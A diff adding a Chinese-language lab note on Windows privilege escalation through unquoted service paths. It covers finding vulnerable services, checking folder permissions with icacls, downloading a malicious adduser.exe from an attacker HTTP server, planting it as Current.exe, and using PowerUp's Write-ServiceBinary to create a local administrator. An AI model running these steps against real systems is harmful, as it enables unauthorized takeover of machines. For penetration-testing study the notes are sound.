@@ -1655,4 +1655,246 @@ PS C:\Users\steve> runas /user:dave3 cmd
 ```
 
 ### Unquoted Service Paths
+當主目錄或子目錄具有寫入權限但不能替換其中的檔案時，可以嘗試 [ unquoted service paths](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability)，依據前面可以得知，每個 Windows service 都會對應到對應到一個 executable file。\
+當服務啟用時，會使用到 Windows [CreateProcess function](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
+>[!Important]
+>function 中的第一個parameter: `lpApplicationName` 用於指定執行檔的名稱和可選的路徑\
+但如果這個路徑包含 **空格**，而且 **沒有引號（""）**，Windows 會從左到右解析，並在遇到第一個空格時，認為前面的部分可能是可執行檔，並嘗試加上 `.exe` 來執行。
+
+以下舉例：
+```
+C:\Program Files\My Program\My Service\service.exe
+```
+根據以上路徑，Windows 解析順序如下：
+1. C:\Program.exe
+2. C:\Program Files\My.exe
+3. C:\Program Files\My Program\My.exe
+4. C:\Program Files\My Program\My service\service.exe
+
+可以利用這項 feature，將 malicious executable ，放在對應的路徑。當服務啟動時，放入的 malicious executable 就會有與服務相同的權限，而權限通常會是 LocalSystem account，達到提權。\
+依上方路徑而言，通常 normal user 不會有 `C:\Program Files` 與 `C:\Program Files\My Program\` 的寫入權限。在服務的主目錄可能性較大。
+
+```
+┌──(chw㉿CHW)-[~]
+└─$ xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.171.220
+```
+先列舉正在運行和已停止的服務
+```
+PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
+
+Name                      State   PathName
+----                      -----   --------
+...
+GammaService                             Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+...
+```
+> `Get-CimInstance`：取得 CIM（Common Information Model）Object，類似 `Get-WmiObject`\
+> `-ClassName win32_service`：查詢 win32_service， Windows 內建的 WMI（Windows Management Instrumentation）類別，代表儲存系統中 **所有服務的資訊**\
+>`State`: 可顯示服務 Running 或 Stopped
+>> GammaService 已停止服務 且二進位路徑包含多個空格，因此可能容易受到此攻擊媒介的攻擊。
+
+
+#### 1. 尋找 spaces 與 missing quotes 路徑
+尋找 spaces 與 missing quotes 更有效率的方法: [WMI command-line](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic) (WMIC)\
+可使用 `service`, `get`, `name`, `pathname`， 輸出通過 `findstr`:
+- `/i`: 不區分大小寫\
+- `/v`: 僅打印不匹配的行
+
+>[!Tip]
+> 下方指令在 cmd.exe 而不是 PowerShell 中輸入此命令，以避免第二個findstr 命令中的引號出現轉義問題 。或者也可以在 PowerShell 使用 Select-String 。
+```
+C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+Name                                       PathName                                                                     
+...                                                                                                         
+GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+```
+
+#### 2. 檢查 user 有否服務重啟權限
+使用 Start-Service 和 Stop-Service 啟動和停止
+```
+PS C:\Users\steve> Start-Service GammaService
+WARNING: Waiting for service 'GammaService (GammaService)' to start...
+
+PS C:\Users\steve> Stop-Service GammaService
+```
+> 成功執行，代表 Steve 有權限
+
+GammaService 路徑分析:
+1. C:\Program.exe
+2. C:\Program Files\Enterprise.exe
+3. C:\Program Files\Enterprise Apps\Current.exe
+4. C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+
+#### 3. 檢查 user 對於服務路徑的編輯權限
+使用 icacls 檢查這些路徑中的存取權限
+```
+PS C:\Users\steve> icacls "C:\"
+C:\ BUILTIN\Administrators:(OI)(CI)(F)
+    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+    BUILTIN\Users:(OI)(CI)(RX)
+    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
+    NT AUTHORITY\Authenticated Users:(AD)
+    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
+    
+Successfully processed 1 files; Failed processing 0 files
+    
+PS C:\Users\steve>icacls "C:\Program Files"
+C:\Program Files NT SERVICE\TrustedInstaller:(F)
+                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
+                 NT AUTHORITY\SYSTEM:(M)
+                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+                 BUILTIN\Administrators:(M)
+                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
+                 BUILTIN\Users:(RX)
+                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
+                 CREATOR OWNER:(OI)(CI)(IO)(F)
+...
+
+Successfully processed 1 files; Failed processing 0 files
+```
+> steve 是 BUILTIN\Users 和 NT AUTHORITY\AUTHENTICATED Users 的 GroupMember，沒有寫入權限。
+
+```
+PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
+C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
+                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                 BUILTIN\Administrators:(OI)(CI)(F)
+                                 BUILTIN\Users:(OI)(CI)(RX,W)
+                                 CREATOR OWNER:(OI)(CI)(IO)(F)
+                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
+                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+> BUILTIN\Users:(OI)(CI)(RX,W)\
+> 只能針對 `C:\Program Files\Enterprise Apps\` 下手
+
+目標 :golf:： 將一個名為 `Current.exe` 的惡意檔案放入 `C:\Program Files\Enterprise Apps\` 中。
+
+#### 4. 將 malicious executable 存入對應路徑
+可以使用上方 [Service Binary Hijacking](#Service-Binary-Hijacking) 編譯好的 adduser.exe 
+```
+┌──(chw㉿CHW)-[~]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+```
+PS C:\Users\steve> iwr -uri http://192.168.45.212/adduser.exe -Outfile Current.exe
+PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
+```
+> 複製到指令路徑後，重啟服務將會執行 `Current.exe` 而不是原始服務二進位檔 `GammaServ.exe`
+
+#### 5. 重啟指定服務
+```
+PS C:\Users\steve> Start-Service GammaService
+Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
+service GammaService on computer '.'.
+At line:1 char:1
++ Start-Service GammaService
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
+   ServiceCommandException
+    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand
+```
+> 這個錯誤源自於 cross-compiled C code 不接受原始服務二進位路徑剩餘的參數\
+> 🥚 `Current.exe` 仍會被成功執行
+```
+PS C:\Users\steve> net user
+
+Administrator            BackupAdmin              dave
+dave2                    daveadmin                DefaultAccount
+Guest                    offsec                   steve
+WDAGUtilityAccount
+The command completed successfully.
+
+PS C:\Users\steve> net localgroup administrators
+...
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+BackupAdmin
+dave2
+daveadmin
+offsec
+The command completed successfully.
+```
+> user dave2 成功被新增
+> 可用 Administrator (dave2) 登入
+
+#### 6. [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) automated tool
+一樣將 `ExecutionPolicy` 設定為 Bypass 並使用 `Get-UnquotedService`
+```
+PS C:\Users\steve> iwr http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
+
+PS C:\Users\steve> powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\steve> . .\PowerUp.ps1
+
+PS C:\Users\steve> Get-UnquotedService
+
+ServiceName    : GammaService
+Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
+                 Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
+CanRestart     : True
+Name           : GammaService
+
+ServiceName    : GammaService
+Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
+                 Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
+CanRestart     : True
+Name           : GammaService
+...
+```
+> GammaService 被識別為存在漏洞
+
+使用 AbuseFunction 並重新啟動服務\
+將惡意程式 Current.exe 放置在 `C:\Program Files\Enterprise Apps\`
+```
+PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+
+ServiceName  Path                                         Command
+-----------  ----                                         -------
+GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...
+
+PS C:\Users\steve> Restart-Service GammaService
+WARNING: Waiting for service 'GammaService (GammaService)' to start...
+Restart-Service : Failed to start service 'GammaService (GammaService)'.
+At line:1 char:1
++ Restart-Service GammaService
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Restart-Service]
+   , ServiceCommandException
+    + FullyQualifiedErrorId : StartServiceFailed,Microsoft.PowerShell.Commands.RestartServiceCommand
+
+PS C:\Users\steve> net user
+
+User accounts for \\CLIENTWK220
+
+-------------------------------------------------------------------------------
+Administrator            BackupAdmin              dave
+dave2                    daveadmin                DefaultAccount
+Guest                    john            offsec
+steve                    WDAGUtilityAccount
+
+The command completed successfully.
+
+PS C:\Users\steve> net localgroup administrators
+...
+john
+...
+```
+> 透過使用 AbuseFunction, Write-ServiceBinary，使用者 john被建立為本地管理員
+
+###  Abusing Other Windows Components
 
